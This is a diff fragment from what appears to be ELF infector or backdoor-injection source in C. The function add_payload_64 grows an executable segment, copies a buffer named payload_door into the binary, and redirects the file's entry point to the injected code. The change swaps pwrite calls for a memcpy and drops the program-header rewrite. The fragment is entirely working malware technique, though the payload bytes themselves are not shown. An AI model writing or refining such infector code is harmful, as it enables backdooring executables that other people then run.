@@ -286,14 +286,9 @@ int add_payload_64(unsigned char *file, size_t size_file, int fd) {
     exec_segment->p_filesz += payload_size;
     exec_segment->p_memsz += payload_size;
 
-    pwrite(fd, payload_door, payload_size, injection_offset);
-    // memcpy(file + injection_offset, payload_door, payload_size);
-
-    size_t phdrs_size = ehdr->e_phnum * sizeof(Elf64_Phdr);
-    pwrite(fd, phdr, phdrs_size, ehdr->e_phoff);
+    memcpy(file + injection_offset, payload_door, payload_size);
 
     ehdr->e_entry = injection_vaddr;
-    pwrite(fd, ehdr, sizeof(Elf64_Ehdr), 0);
 
     return payload_size;
 }
